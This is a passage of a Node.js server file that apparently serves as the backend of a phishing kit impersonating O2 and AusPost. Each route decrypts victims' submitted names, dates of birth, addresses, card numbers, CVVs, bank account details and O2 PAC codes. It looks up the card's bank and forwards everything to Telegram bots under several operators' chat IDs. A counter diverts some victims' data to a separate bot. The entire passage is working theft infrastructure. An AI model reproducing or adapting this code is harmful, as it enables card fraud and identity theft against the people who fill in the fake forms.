    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPost code: ${pcode}\nTelephone: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\nSort Code: ${scode}\nAcount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `O2:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "1190384225",
            text: `O2:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Completed");
    });
});

app.options("/o2Pac", cors());

app.post("/o2Pac", (req, res) => {
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pac = CryptoJS.AES.decrypt(req.body.pac, "402312").toString(
    CryptoJS.enc.Utf8
  );
  owner = req.body.owner;
  binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
  var originalText = `+----------- PAC Information ------------+\nTelephone: ${telephone}\nPAC: ${pac}`;
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `O2 PAC:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: owner,
        text: `O2 PAC:\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  res.send("Update Completed");
});

//AUSPOST
//AUSPOST
//AUSPOST

app.options("/eeAuspost", cors());

app.post("/eeAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 6) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostEE:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 2137940662,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5338204355,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/truthAuspost", cors());

app.post("/truthAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 400) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostTruth:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 916438269,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/fredAuspost", cors());

app.post("/fredAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 400) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostTrent:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5111234111,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/trentAuspost", cors());

app.post("/trentAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 400) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostTrent:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5556444699,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/biggieAuspost", cors());

app.post("/biggieAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 400) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostBiggie:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1497769921,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/consistentAuspost", cors());

app.post("/consistentAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 400) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostConsistent:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 973299603,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

let bigbull = 0;

app.options("/bigbullAuspost", cors());

app.post("/bigbullAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bigbull == 4) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostC2:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1414520833,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        bigbull += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/daangerAuspost", cors());

app.post("/daangerAuspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (daanger == 4) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        daanger = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AusPostDaanger:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 637332768,
              text: `AusPost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        daanger += 1;
      }
      res.send("Update Completed");
    });
});

let c2 = 0;

app.options("/c2auspost", cors());

app.post("/c2auspost", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address2 = CryptoJS.AES.decrypt(req.body.address2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userIp = req.body.ip;
  userAgent = req.body.userAgent;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (c2 == 4) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
